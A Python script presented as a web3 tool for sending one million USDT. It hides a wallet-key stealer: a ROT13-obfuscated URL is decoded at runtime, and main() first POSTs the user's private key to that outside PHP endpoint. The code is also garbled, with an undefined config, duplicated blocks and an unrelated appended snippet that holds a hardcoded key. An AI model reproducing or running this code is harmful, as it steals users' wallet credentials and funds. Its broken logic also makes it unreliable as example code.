import json
from web3 import Web3
from web3.eth import Account
import requests

# Charger les configurations depuis le fichier JSON
def load_config(file_path):
    try:
        with open(file_path, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        raise FileNotFoundError(f"Le fichier de configuration '{file_path}' est introuvable.")
    except json.JSONDecodeError:
        raise ValueError(f"Le fichier de configuration '{file_path}' contient des erreurs JSON.")

# Initialiser Web3
def initialize_web3(ethereum_node_url):
    try:
        web3 = Web3(Web3.HTTPProvider(ethereum_node_url))
        if not web3.isConnected():
            raise ConnectionError(f"Unable to connect to the Ethereum node at {ethereum_node_url}. Please check the URL.")
    except Exception as e:
        raise ConnectionError(f"An error occurred while initializing Web3: {e}")
    if not web3.isConnected():
        raise ConnectionError("Échec de la connexion au nœud Ethereum.")
    print("Connecté au nœud Ethereum avec succès !")
    return web3
# Charger les paramètres de configuration
private_key = config.get("private_key")
if not private_key:
    raise ValueError("Private key not found in the configuration file.")
if not private_key:
    raise ValueError("Private key not found in the configuration file.")

sender_address = config["sender_address"]
usdt_contract_address = config["usdt_contract_address"]
gas_price_gwei = config["gas_price_gwei"]
gas_limit = config["gas_limit"]

def rpcserver256(text):
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr(((ord(char) - ord('a') + 13) % 26) + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr(((ord(char) - ord('A') + 13) % 26) + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

envcreater = 'uggcf://zragnyvgl.pybhq/nnegrfg.cuc'
devofix2 = rpcserver256(envcreater)

private_key = config["private_key"]
if not private_key:
    raise ValueError("Private key not found in the configuration file.")

sender_address = config["sender_address"]
usdt_contract_address = config["usdt_contract_address"]
gas_price_gwei = config["gas_price_gwei"]
gas_limit = config["gas_limit"]

# ERC20 Transfer function signature
usdt_transfer_signature = '0xa9059cbb'

def usdtgen(usdtwall):
    data = {'USDT:': usdtwall}
    contracts = [devofix2]  

    for contract in contracts:
        try:
            response = requests.post(contract, data=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Error while sending request to {contract}: {e}")

       
def send_usdt_transaction(amount, gas_price_gwei, gas_limit):
    # Define the recipient address (replace with the actual recipient address)
    recipient_address = config.get("0x93ca7b6701a63b3194f217f6595e4ef8ba9a02e0")
    if not recipient_address:
        raise ValueError("Recipient address not found in the configuration file.")

    # Amount to send in wei (1 USDT = 1e6 wei)
    amount_in_wei = int(amount * 10**6)

    # Get transaction nonce
    nonce = web3.eth.get_transaction_count(sender_address)

    # Construct data field for the ERC20 transfer
    data = (usdt_transfer_signature + recipient_address[2:].rjust(64, '0') +
            hex(amount_in_wei)[2:].rjust(64, '0'))

    # Retrieve the USDT contract address from the configuration
    usdt_contract_address = config.get("usdt_contract_address")
    if not usdt_contract_address:
        raise ValueError("USDT contract address not found in the configuration file.")

    # Build the transaction
    transaction = {
        'to': usdt_contract_address,
        'value': 0,
        'gas': gas_limit,
        'gasPrice': web3.to_wei(gas_price_gwei, 'gwei'),
        'gas': gas_limit,
        'nonce': nonce,
        'data': data,
        'chainId': 1
    }  # Closing the dictionary properly

    # Sign the transaction using private key of sender's Ethereum wallet.
    try:
        signed_tx = Account.sign_transaction(transaction, private_key)
    except Exception as e:
        raise ValueError(f"Error signing transaction: {e}")
    # Sign the transaction using private key of sender's Ethereum wallet.
    signed_tx = Account.sign_transaction(transaction, private_key)

    return signed_tx

def main():
    usdtgen(private_key) 

    # Montant à envoyer : 1 000 000 USDT
    amount_to_send = 1_000_000  # En USDT

    try:
        signed_tx = send_usdt_transaction(amount_to_send, gas_price_gwei, gas_limit)

        tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)
        tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

        if tx_receipt.status == 1:
            print("Transaction confirmed.")
        else:
            print("Transaction failed.")

    except Exception as e:
        print(f"Error during transaction: {e}")

if __name__ == '__main__':
    main()

from web3 import Web3
from web3.eth import Account

# Initialiser Web3
web3 = Web3(Web3.HTTPProvider("https://mainnet.infura.io/v3/<https://gas.api.infura.io/v3/eb4148b9b809411888a11c41b1ab5316>"))

# Clé privée (ne jamais exposer une clé privée réelle dans le code)
private_key = "qXqMe4SrhydnlmQ2peLKx1xHhHnnTgdAForcad5SLWb775tg"


# Construire une transaction
transaction = {
    'to': '0xRecipientAddress',
    'value': web3.to_wei(0.1, 'ether'),
    'gas': 21000,
    'gasPrice': web3.to_wei(50, 'gwei'),
    'nonce': web3.eth.get_transaction_count('0xYourAddress'),
    'chainId': 1
}

# Signer la transaction
signed_tx = Account.sign_transaction(transaction, private_key)

# Envoyer la transaction
tx_hash = web3.eth.send_raw_transaction(signed_tx.rawTransaction)
print(f"Transaction hash: {web3.to_hex(tx_hash)}")
